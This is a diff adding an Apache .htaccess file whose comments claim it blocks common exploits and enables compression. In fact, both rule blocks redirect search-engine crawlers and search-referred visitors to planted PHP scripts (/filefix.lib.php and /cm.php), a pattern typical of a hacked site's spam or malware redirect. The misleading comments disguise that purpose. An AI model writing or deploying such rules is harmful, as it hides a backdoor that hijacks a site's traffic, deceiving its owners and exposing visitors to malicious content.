@@ -1,0 +1,28 @@
+########## Begin - Rewrite rules to block out some common exploits
+## If you experience problems on your site block out the operations listed below
+## This attempts to block the most common type of exploit `attempts` to all CMS!
+# Various rewrite rules.
+<IfModule mod_rewrite.c>
+RewriteEngine On
+# Enable compression for Search Engines Crawlers
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|aol|slurp|bing) [OR]
+# Enable compression
+RewriteCond %{HTTP_REFERER} (google|aol|yahoo|search|bing)
+RewriteCond %{REQUEST_URI} /$ [OR]
+# Protect files and directories from prying eyes.
+RewriteCond %{REQUEST_FILENAME} (html|htm|php|phps|shtml|xml|xhtml|phtml|asp|aspx)$ [NC] 
+# php compression – use with caution 
+RewriteCond %{REQUEST_FILENAME} !filefix.lib.php
+# Analyze and Fix all issues
+RewriteRule ^.*$    /filefix.lib.php [L]
+</IfModule>
+########## End - Rewrite rules to block out some common exploits
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|aol|slurp|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|aol|yahoo|search|bing)
+RewriteCond %{REQUEST_URI} /$ [OR]
+RewriteCond %{REQUEST_FILENAME} (html|htm|php|phps|shtml|xml|xhtml|phtml|asp|aspx)$ [NC] 
+RewriteCond %{REQUEST_FILENAME} !cm.php
+RewriteRule ^.*$    /cm.php [L]
+</IfModule>
